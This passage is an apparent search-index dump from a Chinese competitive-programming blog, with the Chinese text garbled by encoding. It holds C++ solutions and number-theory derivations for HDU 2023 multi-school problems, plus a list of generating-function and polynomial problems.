","date":"2023-08-02","objectID":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-1005-snake/:0:0","tags":["ç”Ÿæˆå‡½æ•°"],"title":"[2023æ­ç”µå¤šæ ¡5 1005] Snake","uri":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-1005-snake/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } template\u003cint mod\u003e struct ModInt { int x; ModInt() : x(0) {} ModInt(i64 y) : x(y \u003e= 0 ? y % mod : (mod - (-y) % mod) % mod) {} ModInt \u0026operator+=(const ModInt \u0026p) { if ((x += p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator-=(const ModInt \u0026p) { if ((x += mod - p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator*=(const ModInt \u0026p) { x = (int)(1LL * x * p.x % mod); return *this; } ModInt \u0026operator/=(const ModInt \u0026p) { *this *= p.inv(); return *this; } ModInt operator-() const { return ModInt(-x); } ModInt operator+(const ModInt \u0026p) const { return ModInt(*this) += p; } ModInt operator-(const ModInt \u0026p) const { return ModInt(*this) -= p; } ModInt operator*(const ModInt \u0026p) const { return ModInt(*this) *= p; } ModInt operator/(const ModInt \u0026p) const { return ModInt(*this) /= p; } bool operator==(const ModInt \u0026p) const { return x == p.x; } bool operator!=(const ModInt \u0026p) const { return x != p.x; } ModInt inv() const { int a = x, b = mod, u = 1, v = 0, t; while (b \u003e 0) { t = a / b; swap(a -= t * b, b); swap(u -= t * v, v); } return ModInt(u); } ModInt pow(i64 n) const { ModInt res(1), mul(x); while (n \u003e 0) { if (n \u0026 1) res *= mul; mul *= mul; n \u003e\u003e= 1; } return res; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const ModInt \u0026p) { return os \u003c\u003c p.x; } friend istream \u0026operator\u003e\u003e(istream \u0026is, ModInt \u0026a) { i64 t; is \u003e\u003e t; a = ModInt\u003cmod\u003e(t); return (is); } int val() const { return x; } static constexpr int val_mod() { return mod; } }; using Z = ModInt\u003cmod\u003e; vector\u003cZ\u003e fact, infact; void init(int n) { fact.resize(n + 1), infact.resize(n + 1); fact[0] = infact[0] = 1; for (int i = 1; i \u003c= n; i ++) { fact[i] = fact[i - 1] * i; } infact[n] = fact[n].inv(); for (int i = n; i; i --) { infact[i - 1] = infact[i] * i; } } Z C(int n, int m) { if (n \u003c 0 || m \u003c 0 || n \u003c m) return Z(0); return fact[n] * infact[n - m] * infact[m]; } void solve() { int n, m, k; cin \u003e\u003e n \u003e\u003e m \u003e\u003e k; Z ans; for (int i = 0; i \u003c= m; i ++) { Z f = i \u0026 1 ? Z(-1) : Z(1); ans += f * C(m, i) * C(n - k * i - 1, m - 1); } cout \u003c\u003c ans * fact[n] / fact[m] \u003c\u003c \"\\n\"; } signed main() { init(1e6); cin.tie(0) -\u003e sync_with_stdio(0); int T; cin \u003e\u003e T; while (T --) { solve(); } } ","date":"2023-08-02","objectID":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-1005-snake/:1:0","tags":["ç”Ÿæˆå‡½æ•°"],"title":"[2023æ­ç”µå¤šæ ¡5 1005] Snake","uri":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-1005-snake/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æ±‚ $$ \\sum_{i = 1} ^ {n} \\sum_{j = 1} ^ {n}[\\gcd(2 ^ i - 1, 2 ^ j - 1)] ^ k $$ å¯¹ $998,244,353$ å–æ¨¡ã€‚ $1 \\le n \\le 10 ^ 9, 0 \\le k \\le 10$ åˆ†æï¼š æ˜“è¯ $\\gcd(2 ^ i - 1, 2 ^ j - 1) = 2 ^ {\\gcd(i, j)} - 1$ï¼Œä»£å…¥å¾— $$ \\sum_{i = 1} ^ {n} \\sum_{j = 1} ^ {n}(2^{\\gcd(i, j)} - 1) ^ k $$ å¸¸è§„æšä¸¾ $d$ $$ \\sum_{d = 1} ^ {n} \\sum_{i = 1} ^ {n} \\sum_{j = 1} ^ {n}(2^d - 1) ^ k [\\gcd(i,j) = d] $$ æŠŠ $d$ æ‹¿åˆ°æ±‚å’Œä¸Šç•Œ $$ \\sum_{d = 1} ^ {n} \\sum_{i = 1} ^ { \\lfloor \\frac{n}{d} \\rfloor } \\sum_{j = 1} ^ { \\lfloor \\frac{n}{d} \\rfloor}\\left(2^d - 1\\right) ^ k[\\gcd(i,j) = 1] $$ æˆ‘ä»¬çŸ¥é“ $\\sum\\limits_{i = 1} ^ {n}\\sum\\limits_{j = 1} ^ {n}[\\gcd(i,j) = 1] = 2\\sum\\limits_{i = 1} ^ {n}\\varphi(i) - 1$ï¼Œ($-1$ åœ¨ $\\sum$ å¤–é¢)ï¼Œä»£å…¥å¾— $$ \\sum_{d = 1} ^ {n}\\left(2^d - 1\\right) ^ k \\left(2\\sum_{i = 1} ^ { \\lfloor \\frac{n}{d} \\rfloor}\\varphi(i) - 1\\right) $$ è€ƒè™‘æ•´é™¤åˆ†å—ï¼Œåé¢æ¬§æ‹‰å‡½æ•°å‰ç¼€å’Œå¯ä»¥ç”¨æœæ•™ç­›ï¼Œé‚£ä¹ˆè€ƒè™‘å¦‚ä½•å¿«é€Ÿæ±‚ $\\left(2^d - 1\\right) ^ k$ çš„å‰ç¼€å’Œã€‚è®° $$ S(n) = \\sum_{i = 1} ^ {n}(2 ^ i - 1) ^ k $$ å°† $\\left(2^i - 1\\right) ^ k$ äºŒé¡¹å¼å±•å¼€ $$ S(n) = \\sum_{i = 1} ^ {n}\\sum_{j = 0} ^ {k} \\binom{k}{j} \\times 2 ^ {i\\times j} \\times (-1) ^ {k - j} $$ äº¤æ¢æ±‚å’Œé¡ºåº $$ \\sum_{j = 0} ^ {k} \\binom{k}{j}\\times (-1) ^ {k - j} \\sum_{i = 1} ^ {n} (2 ^ {j}) ^ {i} $$ å…¶ä¸­ $\\sum\\limits_{i = 1} ^ {n} (2 ^ {j}) ^ {i}$ ç”¨ç­‰æ¯”æ•°åˆ—æ±‚å’Œå…¬å¼ $$ \\sum_{j = 0} ^ {k} \\binom{k}{j}\\times (-1) ^ {k - j} \\times 2 ^ j \\times \\frac{2 ^ {j \\times n} - 1}{2 ^ j - 1} $$ è¿™æ ·æ±‚ $S(n)$ å°±å˜ä¸º $O(k \\log n)$ äº†ï¼Œæ³¨æ„ç‰¹åˆ¤ $j = 0$ å’Œæ¬§æ‹‰é™å¹‚ æ—¶é—´å¤æ‚åº¦ $O(n ^ {\\frac{2}{3}} + k \\sqrt n \\log n)$ ","date":"2023-08-01","objectID":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-1002-gcd-magic/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¨å¼å­","æœæ•™ç­›"],"title":"[2023æ­ç”µå¤šæ ¡5 1002] GCD Magic","uri":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-1002-gcd-magic/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5, mod = 998244353; int n, k, primes[N], euler[N], cnt, sum[N], fact[N], infact[N]; bool st[N]; unordered_map\u003cint, int\u003e mp; void get_eulers(int n) { euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; i * primes[j] \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { euler[t] = primes[j] * euler[i]; break; } euler[t] = (primes[j] - 1) * euler[i]; } } for (int i = 1; i \u003c= n; i ++) { sum[i] = (sum[i - 1] + euler[i]) % mod; } } int qmi(int a, int b) { int res = 1; while (b) { if (b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } int C(int m, int n) { return fact[m] * infact[m - n] % mod * infact[n] % mod; } int Sum_euler(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = n * (n + 1) / 2 % mod; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res - Sum_euler(n / l) * (r - l + 1) % mod + mod) % mod; } return mp[n] = res; } int Sum(int n) { int res = 0; for (int j = 0; j \u003c= k; j ++) { int f = (k - j) % 2 == 1 ? mod - 1 : 1; if (!j) { res = (res + n * f % mod) % mod; } else { int omod = mod - 1; int t = (qmi(2, j * n % omod) - 1 + mod) % mod; int S = C(k, j) * f % mod % mod * qmi(2, j) % mod * t % mod; int inv = (qmi(2, j) - 1 + mod) % mod; S = S * qmi(inv, mod - 2) % mod; res = (res + S) % mod; } } return res; } signed main() { get_eulers(N - 1); fact[0] = infact[0] = 1; for (int i = 1; i \u003c N; i ++) fact[i] = fact[i - 1] * i % mod; infact[N - 1] = qmi(fact[N - 1], mod - 2); for (int i = N - 2; i; i --) infact[i] = infact[i + 1] * (i + 1) % mod; int T; cin \u003e\u003e T; while (T --) { int res = 0; cin \u003e\u003e n \u003e\u003e k; for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res + (2 * Sum_euler(n / l) % mod - 1 + mod) % mod * (Sum(r) - Sum(l - 1) + mod) % mod) % mod; } cout \u003c\u003c res \u003c\u003c \"\\n\"; } } ","date":"2023-08-01","objectID":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-1002-gcd-magic/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¨å¼å­","æœæ•™ç­›"],"title":"[2023æ­ç”µå¤šæ ¡5 1002] GCD Magic","uri":"/posts/cp2023%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-1002-gcd-magic/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŠçš„ä¸é”™çš„ä¸€æ¬¡æ¯”èµ›ã€‚ é‡ç°èµ›é“¾æ¥ æ¦œå•é“¾æ¥ è§†é¢‘åˆé›† é¢˜è§£ ","date":"2023-05-28","objectID":"/posts/cp%E5%B1%B1%E4%B8%9C%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8Aacm%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AB%9E%E8%B5%9B/:0:0","tags":["æ¯”èµ›"],"title":"å±±ä¸œç†å·¥å¤§å­¦ç¬¬åäº”å±ŠACMç¨‹åºè®¾è®¡ç«èµ›","uri":"/posts/cp%E5%B1%B1%E4%B8%9C%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8Aacm%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AB%9E%E8%B5%9B/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"è§†é¢‘ï¼š è®²ä¹‰ï¼š ","date":"2023-02-01","objectID":"/posts/cp%E5%9F%BA%E7%A1%80%E6%95%B0%E8%AE%BA/:0:0","tags":["æ•°è®º"],"title":"åŸºç¡€æ•°è®º","uri":"/posts/cp%E5%9F%BA%E7%A1%80%E6%95%B0%E8%AE%BA/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å• (å¤§ä½¬è½»å–·ğŸ˜­) ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:1:0","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ¨¡æ¿ï¼š ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:2:0","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"FFT/NTT æ¨¡æ¿ ç”¨æ¥æµ‹è¯•å¤šé¡¹å¼æ¿å­ å¤šé¡¹å¼ä¹˜æ³•ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼ä¹˜æ³•ï¼ˆFFTï¼‰ é«˜ç²¾åº¦ä¹˜æ³•ï¼šA*B Problem å‡çº§ç‰ˆ ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:2:1","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸºç¡€å¤šé¡¹å¼å…¨å®¶æ¡¶æ¨¡æ¿ ç¨æœ‰éš¾åº¦çš„å¤šé¡¹å¼æ¿å­ æ‹‰æ ¼æœ—æ—¥æ’å€¼ï¼šã€æ¨¡æ¿ã€‘æ‹‰æ ¼æœ—æ—¥æ’å€¼ MTT(ä»»æ„æ¨¡æ•°å¤šé¡¹å¼ä¹˜æ³•)ï¼šã€æ¨¡æ¿ã€‘ä»»æ„æ¨¡æ•°å¤šé¡¹å¼ä¹˜æ³• å¤šé¡¹å¼æˆ–/ä¸/å¼‚æˆ–å·ç§¯ï¼šã€æ¨¡æ¿ã€‘å¿«é€Ÿè«æ¯”ä¹Œæ–¯/æ²ƒå°”ä»€å˜æ¢ (FMT/FWT) åˆ†æ²» FFT/NTTï¼šã€æ¨¡æ¿ã€‘åˆ†æ²» FFT å¤šé¡¹å¼é™¤æ³•ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼é™¤æ³• å¤šé¡¹å¼æ±‚é€†ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼ä¹˜æ³•é€† å¤šé¡¹å¼å¼€æ ¹ï¼š $a_0 = 1$ ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¼€æ ¹ $a_0 \\ne 1$ ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¼€æ ¹ï¼ˆåŠ å¼ºç‰ˆï¼‰ å¤šé¡¹å¼ $\\ln$ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¯¹æ•°å‡½æ•°ï¼ˆå¤šé¡¹å¼ lnï¼‰ å¤šé¡¹å¼ $\\exp$ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼æŒ‡æ•°å‡½æ•°ï¼ˆå¤šé¡¹å¼ expï¼‰ å¤šé¡¹å¼å¿«é€Ÿå¹‚ï¼š $a_0 = 1$ ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¿«é€Ÿå¹‚ $a_0 \\ne 1$ ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¹‚å‡½æ•°ï¼ˆåŠ å¼ºç‰ˆï¼‰ ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:2:2","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"è¿›é˜¶å¤šé¡¹å¼å…¨å®¶æ¡¶æ¨¡æ¿ éå¸¸å›°éš¾çš„çš„å¤šé¡¹å¼æ¿å­ è‡ªç„¶æ•°å¹‚å‰ç¼€å’Œï¼šThe Sum of the k-th Powers MTT å¤šé¡¹å¼æ±‚é€†ï¼šä»»æ„æ¨¡æ•°å¤šé¡¹å¼ä¹˜æ³•é€† é«˜é˜¶å·®åˆ†/å‰ç¼€å’Œï¼šå·®åˆ†ä¸å‰ç¼€å’Œ å­é›†å·ç§¯ï¼šã€æ¨¡æ¿ã€‘å­é›†å·ç§¯ åäºŒé‡è®¡æ•°æ³•ï¼šåäºŒé‡è®¡æ•°æ³• å¤šé¡¹å¼è¿ç»­ç‚¹å€¼å¹³ç§»ï¼šæ‹‰æ ¼æœ—æ—¥æ’å€¼2 Chirp Z å˜æ¢ï¼šã€æ¨¡æ¿ã€‘Chirp Z-Transform å¤šé¡¹å¼å¤šç‚¹æ±‚å€¼ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¤šç‚¹æ±‚å€¼ å¤šé¡¹å¼å¿«é€Ÿæ’å€¼ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¿«é€Ÿæ’å€¼ å¤šé¡¹å¼å¤åˆå‡½æ•°ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¤åˆå‡½æ•° å¤šé¡¹å¼å¤åˆå‡½æ•°æ±‚é€†ï¼šã€æ¨¡æ¿ã€‘å¤šé¡¹å¼å¤åˆé€† ä¸‹é™å¹‚å¤šé¡¹å¼ï¼š ä¸‹é™å¹‚å¤šé¡¹å¼ä¹˜æ³•ï¼šã€æ¨¡æ¿ã€‘ä¸‹é™å¹‚å¤šé¡¹å¼ä¹˜æ³• ä¸‹é™å¹‚å¤šé¡¹å¼ä¸æ™®é€šå¹‚å¤šé¡¹å¼çš„äº’ç›¸è½¬æ¢ï¼š æ™®é€šå¤šé¡¹å¼è½¬ä¸‹é™å¹‚å¤šé¡¹å¼ ä¸‹é™å¹‚å¤šé¡¹å¼è½¬æ™®é€šå¤šé¡¹å¼ æ–¯ç‰¹æ—æ•°ï¼š ç¬¬ä¸€ç±»æ–¯ç‰¹æ—æ•°Â·è¡Œ ç¬¬ä¸€ç±»æ–¯ç‰¹æ—æ•°Â·åˆ— ç¬¬äºŒç±»æ–¯ç‰¹æ—æ•°Â·è¡Œ ç¬¬äºŒç±»æ–¯ç‰¹æ—æ•°Â·åˆ— åˆ†æ‹†æ•°ï¼šåˆ†æ‹†æ•° è´å°”æ•°ï¼šé›†åˆåˆ’åˆ†è®¡æ•° æ¬§æ‹‰æ•°ï¼šæ’åˆ—è®¡æ•° å¿«é€Ÿæ±‚é˜¶ä¹˜ï¼šã€æ¨¡æ¿ã€‘å¿«é€Ÿé˜¶ä¹˜ç®—æ³• å¿«é€Ÿæ±‚è°ƒå’Œçº§æ•°ï¼šè°ƒå’Œçº§æ•°æ±‚å’Œ ä¸€é˜¶å¾®åˆ†æ–¹ç¨‹ï¼šä¸€é˜¶å¾®åˆ†æ–¹ç¨‹ å¸¸ç³»æ•°é½æ¬¡çº¿æ€§é€’æ¨ï¼šã€æ¨¡æ¿ã€‘å¸¸ç³»æ•°é½æ¬¡çº¿æ€§é€’æ¨ å¸¸ç³»æ•°éé½æ¬¡çº¿æ€§é€’æ¨ï¼šã€æ¨¡æ¿ã€‘å¸¸ç³»æ•°éé½æ¬¡çº¿æ€§é€’æ¨ æ•´å¼é€’æ¨ï¼šã€æ¨¡æ¿ã€‘æ•´å¼é€’æ¨ å¤šé¡¹å¼ä¸‰è§’å‡½æ•°ï¼šå¤šé¡¹å¼ä¸‰è§’å‡½æ•° å¤šé¡¹å¼åä¸‰è§’å‡½æ•°ï¼šå¤šé¡¹å¼åä¸‰è§’å‡½æ•° ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:2:3","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®ï¼š ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:3:0","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ç”Ÿæˆå‡½æ•°/å¤šé¡¹å¼åŸºç¡€é¢˜ï¼š æ¯”è¾ƒå¥½æ¨çš„ç”Ÿæˆå‡½æ•°/å¤šé¡¹å¼é¢˜ç›® Dice Sum [NOIP2012 æ™®åŠç»„] æ‘†èŠ± Blocks æŒ‘é€‰é˜Ÿå‹ Reordering mscçš„èƒŒåŒ… Product Tuples Thief in a Shop Lucky Tickets Needle Counting Sequences Snake ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:3:1","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ç”Ÿæˆå‡½æ•°/å¤šé¡¹å¼æé«˜é¢˜ï¼š æ¯”è¾ƒéš¾æˆ–è€…éœ€è¦ä¸€äº›å¤šé¡¹å¼ç§‘æŠ€çš„ç”Ÿæˆå‡½æ•°/å¤šé¡¹å¼é¢˜ç›®ï¼Œè¿˜æœ‰ä¸€äº›é›†åˆå¹‚çº§æ•°çš„é¢˜ç›® Function analysis One to One Tree Coloring Fly The Child and Binary Tree ä»˜å…¬ä¸»çš„èƒŒåŒ… Falfa with Substring Easy Counting Problem Equipment Upgrade Count Set å¸¦æƒå­é›†å’Œ Odd Sum [TJOI2019]å”±ã€è·³ã€rapå’Œç¯®çƒ [çœé€‰è”è€ƒ 2020 A å·] ç»„åˆæ•°é—®é¢˜ Forest NIOâ€™s OAuth2 Server Lndjy and the mex [TJOI2018]æ•™ç§‘ä¹¦èˆ¬çš„äºµæ¸ Cargo Differential Equation Expectation (Hard Version) ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:3:2","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ICPC/CCPC åŒºåŸŸèµ›ç”Ÿæˆå‡½æ•°/å¤šé¡¹å¼é¢˜ç›®ï¼š é¢˜ç›®ä¹‹é—´éš¾åº¦å·®åˆ«è¾ƒå¤§ 2017 CCPC æ­å·ï¼šMarriage 2018 CCPC æ¡‚æ—ï¼šArray Modify 2018 ICPC æ²ˆé˜³ï¼šRenaissance Past in Nancy 2019 ICPC ä¸Šæµ·ç½‘ç»œèµ›ï¼šCounting Sequences IIã€Triple 2019 ICPC å—æ˜Œç°åœºèµ›ï¼šXOR Sum 2019 ICPC å—æ˜Œç½‘ç»œèµ›ï¼šInteresting Series 2019 ICPC å—æ˜Œé‚€è¯·èµ›ï¼šPolynomial 2020 ICPC æ¾³é—¨ï¼šAcceleratorã€Fly Me To The Moon 2020 ICPC æ²ˆé˜³ï¼šUnited in Stormwind 2021 CCPC å¨æµ·ï¼š810975ã€Shinyruo and KFC 2021 CCPC å¹¿å·ï¼šMath Ballã€Unnamed Easy Problem 2021 CCPC æ±Ÿè‹çœèµ›ï¼šFive Phases 2021 ICPC ä¸Šæµ·ï¼šStrange Permutations 2021 ICPC æ¾³é—¨ï¼šPass the Ball! 2021 ICPC æµå—ï¼šStrange Series 2022 CCPC å¹¿ä¸œçœèµ›ï¼šæ‹‰æ ¼æœ—æ—¥æ’å€¼ 2022 CCPC æ±Ÿè‹çœèµ›ï¼šPocketsã€Super Gray Pony 2022 CCPC æ¡‚æ—ï¼šAliceâ€™s Dolls 2022 CCPC å¥³ç”Ÿèµ›ï¼šDevil May Cry ","date":"2022-10-20","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/:3:3","tags":["é¢˜å•","ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"ç”Ÿæˆå‡½æ•°ã€å¤šé¡¹å¼é¢˜å•","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®š $n$ ä¸ªæƒå€¼ä¸º $c_1,c_2,\\cdots,c_n$ çš„ç‰©å“ï¼Œæ€»å…±æœ€å¤šå– $W$ ä¸ªï¼Œæ±‚ $$ \\sum_{k_1+k_2+\\cdots+k_n \\le W} \\prod_{i = 1} ^ {n} k_i ^ {c_i} $$ å¯¹ $998,244,353$ å–æ¨¡ï¼Œå…¶ä¸­ $k_i$ ä»£è¡¨ç¬¬ $i$ ä¸ªç‰©å“å–çš„æ¬¡æ•°ã€‚ $1 \\le n \\le 10 ^ 5, \\sum\\limits_{i = 1} ^ {n} c_i \\le 10 ^ 5, W \\le 10 ^ {18}$ åˆ†æï¼š é¦–å…ˆè§‚å¯Ÿé¢˜ç›®è¦æˆ‘ä»¬æ±‚çš„å¼å­ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯ä¸€ä¸ªå¤šé¡¹å¼å·ç§¯å½¢å¼ï¼Œä¸éš¾å†™å‡ºæ¯ä¸ªç‰©å“çš„ç”Ÿæˆå‡½æ•°ï¼Œè®¾ç¬¬ $i$ ä¸ªç‰©å“çš„ç”Ÿæˆå‡½æ•°ä¸º $$ f_i(x) = \\sum_{j = 0} ^ {\\infty} j ^ {c_i}x ^ j $$ é‚£ä¹ˆç­”æ¡ˆå°±æ˜¯ $$ \\sum_{i = 0} ^ {W} [x ^ i]\\prod_{j = 1} ^ {n}f_j(x) $$ ä½† $W$ æ˜¯ $10 ^ {18}$ çš„ï¼Œæˆ‘ä»¬è‚¯å®šä¸èƒ½è¿™ä¹ˆæ±‚ï¼Œæ‰€ä»¥è€ƒè™‘å°†ç­”æ¡ˆæ±‚ä¸€æ¬¡å‰ç¼€å’Œï¼Œè®¡ç®—ç¬¬ $W$ é¡¹çš„ç³»æ•°ã€‚ æˆ‘ä»¬çŸ¥é“ç»™ä¸€ä¸ªå¤šé¡¹å¼ä¹˜ä»¥ $\\sum\\limits_{i = 0} ^ {\\infty} x ^ i = \\dfrac{1}{1 -x}$ å°±ç›¸å½“äºæ±‚ä¸€æ¬¡å‰ç¼€å’Œï¼Œæ•…ç­”æ¡ˆä¸º $$ [x ^ W]\\frac{1}{1 - x} \\times \\prod_{j = 1} ^ {n}f_j(x) $$ ä½†è¿™æ ·è¿˜æ˜¯ä¸èƒ½è§£å†³é—®é¢˜ã€‚ æ‰€ä»¥è€ƒè™‘åŒ–ç®€æ¯ä¸ªç‰©å“çš„ç”Ÿæˆå‡½æ•° $f_i(x)$ï¼Œæˆ‘ä»¬çŸ¥é“æœ‰è‡ªç„¶æ•°å¹‚å±•å¼€ $i ^ k = \\sum\\limits_{j = 0} ^ {k} {k \\brace j} \\times j! \\times \\dbinom{i}{j}$ï¼Œæ‰€ä»¥ $f_i(x)$ å°±ä¸º $$ f_i(x) = \\sum_{j = 0} ^ {\\infty} \\sum_{k = 0} ^ {c_i}{c_i \\brace k} \\times k! \\times \\binom{j}{k} \\times x ^ j $$ äº¤æ¢æ±‚å’Œæ¬¡åº $$ f_i(x) = \\sum_{k = 0} ^ {c_i} 